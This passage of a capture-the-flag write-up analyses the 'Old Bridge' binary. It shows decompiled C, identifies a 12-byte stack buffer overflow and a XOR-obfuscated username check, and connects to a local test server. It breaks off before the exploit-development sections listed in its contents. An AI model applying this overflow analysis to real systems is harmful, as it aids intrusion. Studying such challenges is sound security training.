<!doctype html><html lang="en"><head><title>Old Bridge | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="64-bit binary. Buffer Overflow. Brute force. Stack Pivot. Ret2Libc"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="64-bit binary. Buffer Overflow. Brute force. Stack Pivot. Ret2Libc"><meta itemprop="keywords" content><meta itemprop="name" content="Old Bridge"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="64-bit binary. Buffer Overflow. Brute force. Stack Pivot. Ret2Libc"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Old Bridge"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/htb-challenges/pwn/old-bridge/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="64-bit binary. Buffer Overflow. Brute force. Stack Pivot. Ret2Libc"><meta name="twitter:description" content="64-bit binary. Buffer Overflow. Brute force. Stack Pivot. Ret2Libc"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Old Bridge"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/htb-challenges/pwn/old-bridge/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/htb-challenges/pwn/old-bridge/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/htb-challenges/pwn/old-bridge/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/old-bridge/&amp;text=Old%20Bridge" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/old-bridge/&amp;title=Old%20Bridge" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Old Bridge</h1><p class="mb4 f6 dib tracked">17 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#buffer-overflow-vulnerability">Buffer Overflow vulnerability</a></li></ul></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#brute-force-attack">Brute force attack</a></li><li><a href="#pie-bypass">PIE bypass</a></li><li><a href="#stack-pivot">Stack Pivot</a></li><li><a href="#leaking-glibc-addresses">Leaking Glibc addresses</a></li><li><a href="#getting-rce">Getting RCE</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a 64-bit binary called <code>oldbridge</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little  
RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
Stack:    <span class="code-dark-green">Canary found</span>
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-green">PIE enabled</span>
</code></pre></div><p>We have almost all protetions enabled, so we must perform several bypasses to exploit the binary.</p><h2 id="reverse-engineering">Reverse engineering</h2><p>As in most binary exploitation challenges, we must do a reverse engineering step to obtain the assembly instructions or the C source code of the binary to determine what it is doing and how we can exploit it.</p><p>This is the <code>main</code> function:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span> <span class="mtk8">main</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">param_1</span><span class="mtk1">,</span> <span class="mtk1">undefined8</span> <span class="mtk5">*</span><span class="mtk9 mtki">param_2</span><span class="mtk1">)</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">iVar1;</span>
  <span class="mtk7 mtki">long</span> <span class="mtk1">in_FS_OFFSET;</span>
  <span class="mtk7 mtki">socklen_t</span> <span class="mtk1">local_50;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_4c;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">local_48;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_44;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">local_40;</span>
  <span class="mtk7 mtki">__pid_t</span> <span class="mtk1">local_3c;</span>
  <span class="mtk1">undefined</span> <span class="mtk1">local_38[</span><span class="mtk6">4</span><span class="mtk1">];</span>
  <span class="mtk7 mtki">uint32_t</span> <span class="mtk1">local_34;</span>
  <span class="mtk1">sockaddr</span> <span class="mtk1">local_28;</span>
  <span class="mtk1">undefined8</span> <span class="mtk1">local_10;</span>

  <span class="mtk1">local_10</span> <span class="mtk5">=</span> <span class="mtk5">*</span><span class="mtk1">(undefined8</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk1">(in_FS_OFFSET</span> <span class="mtk5">+</span> <span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
  <span class="mtk1">local_4c</span> <span class="mtk5">=</span> <span class="mtk6">1</span><span class="mtk1">;</span>

  <span class="mtk5">if</span> <span class="mtk1">(param_1</span> <span class="mtk5">!=</span> <span class="mtk6">2</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"usage:</span> <span class="mtk6">%s</span> <span class="mtk4">&lt;port&gt;</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk5">*</span><span class="mtk1">param_2);</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
    <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">local_48</span> <span class="mtk5">=</span> <span class="mtk8">atoi</span><span class="mtk1">((</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk1">param_2[</span><span class="mtk6">1</span><span class="mtk1">]);</span>
  <span class="mtk8">signal</span><span class="mtk1">(</span><span class="mtk6">2</span><span class="mtk1">,</span> <span class="mtk1">exit_server);</span>
  <span class="mtk1">server_sd</span> <span class="mtk5">=</span> <span class="mtk8">socket</span><span class="mtk1">(</span><span class="mtk6">2</span><span class="mtk1">,</span> <span class="mtk6">1</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">);</span>

  <span class="mtk5">if</span> <span class="mtk1">(server_sd</span> <span class="mtk5">&lt;</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"socket"</span><span class="mtk1">);</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
    <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">setsockopt</span><span class="mtk1">(server_sd,</span> <span class="mtk6">1</span><span class="mtk1">,</span> <span class="mtk6">2</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">local_4c,</span> <span class="mtk6">4</span><span class="mtk1">);</span>

  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">&lt;</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"setsockopt"</span><span class="mtk1">);</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
    <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">local_38._0_2_</span> <span class="mtk5">=</span> <span class="mtk6">2</span><span class="mtk1">;</span>
  <span class="mtk1">local_34</span> <span class="mtk5">=</span> <span class="mtk8">htonl</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
  <span class="mtk1">local_38._2_2_</span> <span class="mtk5">=</span> <span class="mtk8">htons</span><span class="mtk1">((</span><span class="mtk7 mtki">uint16_t</span><span class="mtk1">)</span> <span class="mtk1">local_48);</span>
  <span class="mtk1">local_44</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">;</span>
  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">bind</span><span class="mtk1">(server_sd,</span> <span class="mtk1">(sockaddr</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk1">local_38,</span> <span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">);</span>

  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">&lt;</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"bind"</span><span class="mtk1">);</span>
    <span class="mtk8">close</span><span class="mtk1">(server_sd);</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
    <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">listen</span><span class="mtk1">(server_sd,</span> <span class="mtk6">5</span><span class="mtk1">);</span>

  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">&lt;</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"listen"</span><span class="mtk1">);</span>
    <span class="mtk8">close</span><span class="mtk1">(server_sd);</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
    <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
  <span class="mtk1">}</span>

  <span class="mtk8">signal</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">11</span><span class="mtk1">,</span> <span class="mtk1">(</span><span class="mtk7 mtki">__sighandler_t</span><span class="mtk1">)</span> <span class="mtk5">0x</span><span class="mtk6">1</span><span class="mtk1">);</span>
  <span class="mtk5">while</span> <span class="mtk1">(</span><span class="mtk6">true</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">local_50</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">;</span>
    <span class="mtk1">local_40</span> <span class="mtk5">=</span> <span class="mtk8">accept</span><span class="mtk1">(server_sd,</span> <span class="mtk5">&amp;</span><span class="mtk1">local_28,</span> <span class="mtk5">&amp;</span><span class="mtk1">local_50);</span>  

    <span class="mtk5">if</span> <span class="mtk1">(local_40</span> <span class="mtk5">&lt;</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
      <span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"accept"</span><span class="mtk1">);</span>
      <span class="mtk8">close</span><span class="mtk1">(server_sd);</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
      <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
    <span class="mtk1">}</span>

    <span class="mtk1">local_3c</span> <span class="mtk5">=</span> <span class="mtk8">fork</span><span class="mtk1">();</span>

    <span class="mtk5">if</span> <span class="mtk1">(local_3c</span> <span class="mtk5">&lt;</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk5">break</span><span class="mtk1">;</span>

    <span class="mtk5">if</span> <span class="mtk1">(local_3c</span> <span class="mtk5">==</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
      <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">check_username</span><span class="mtk1">();</span>

      <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
        <span class="mtk8">write</span><span class="mtk1">(local_40,</span> <span class="mtk4">"Username</span> <span class="mtk4">found!</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">);</span>
      <span class="mtk1">}</span>

      <span class="mtk8">close</span><span class="mtk1">(local_40);</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
      <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
    <span class="mtk1">}</span>

    <span class="mtk8">close</span><span class="mtk1">(local_40);</span>
  <span class="mtk1">}</span>

  <span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"fork"</span><span class="mtk1">);</span>
  <span class="mtk8">close</span><span class="mtk1">(local_40);</span>
  <span class="mtk8">close</span><span class="mtk1">(server_sd);</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
  <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>It just starts a socket server and uses <code>fork</code> whenever a new connection arrives. This fact will be important for exploitation.</p><p>Then, it calls <code>check_username</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">bool</span> <span class="mtk8">check_username</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">param_1</span><span class="mtk1">)</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">iVar1;</span>
  <span class="mtk7 mtki">ssize_t</span> <span class="mtk1">sVar2;</span>
  <span class="mtk7 mtki">long</span> <span class="mtk1">in_FS_OFFSET;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">local_420;</span>
  <span class="mtk1">byte</span> <span class="mtk1">local_418[</span><span class="mtk6">1032</span><span class="mtk1">];</span>
  <span class="mtk7 mtki">long</span> <span class="mtk1">local_10;</span>

  <span class="mtk1">local_10</span> <span class="mtk5">=</span> <span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk1">(in_FS_OFFSET</span> <span class="mtk5">+</span> <span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
  <span class="mtk8">write</span><span class="mtk1">(param_1,</span> <span class="mtk4">"Username:</span> <span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk6">10</span><span class="mtk1">);</span>
  <span class="mtk1">sVar2</span> <span class="mtk5">=</span> <span class="mtk8">read</span><span class="mtk1">(param_1,</span> <span class="mtk1">local_418,</span> <span class="mtk5">0x</span><span class="mtk6">420</span><span class="mtk1">);</span>

  <span class="mtk5">for</span> <span class="mtk1">(local_420</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span> <span class="mtk1">local_420</span> <span class="mtk5">&lt;</span> <span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1">)</span> <span class="mtk1">sVar2;</span> <span class="mtk1">local_420</span> <span class="mtk5">=</span> <span class="mtk1">local_420</span> <span class="mtk5">+</span> <span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>  
    <span class="mtk1">local_418[local_420]</span> <span class="mtk5">=</span> <span class="mtk1">local_418[local_420]</span> <span class="mtk5">^</span> <span class="mtk5">0x</span><span class="mtk6">d</span><span class="mtk1">;</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">memcmp</span><span class="mtk1">(local_418,</span> <span class="mtk4">"il{dih"</span><span class="mtk1">,</span> <span class="mtk6">6</span><span class="mtk1">);</span>

  <span class="mtk5">if</span> <span class="mtk1">(local_10</span> <span class="mtk5">!=</span> <span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span> <span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET</span> <span class="mtk5">+</span> <span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">))</span> <span class="mtk1">{</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
    <span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
  <span class="mtk1">}</span>

  <span class="mtk5">return</span> <span class="mtk1">iVar1</span> <span class="mtk5">==</span> <span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><h3 id="buffer-overflow-vulnerability">Buffer Overflow vulnerability</h3><p>Here we have a Buffer Overflow vulnerability since <code>local_418</code> is assigned 1032 bytes and <code>read</code> is copying <code>0x420</code> = 1044 bytes in <code>local_418</code>, thus overflowing the reserved buffer in 12 bytes.</p><p>Another thing to notice is that the input data is being ciphered with XOR and a key of <code>0xd</code>. Finally, it is compared to <code>"il{dih"</code>. We are able to revert the encryption as follows:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
&gt;&gt;&gt; bytes([c ^ 0xd for c in b'il{dih']).decode()  
'davide'
</code></pre></div><p>At this point, we have the expected username:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./oldbridge</span> 1234  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> 127.0.0.1 1234  
Username: davide
Username found!
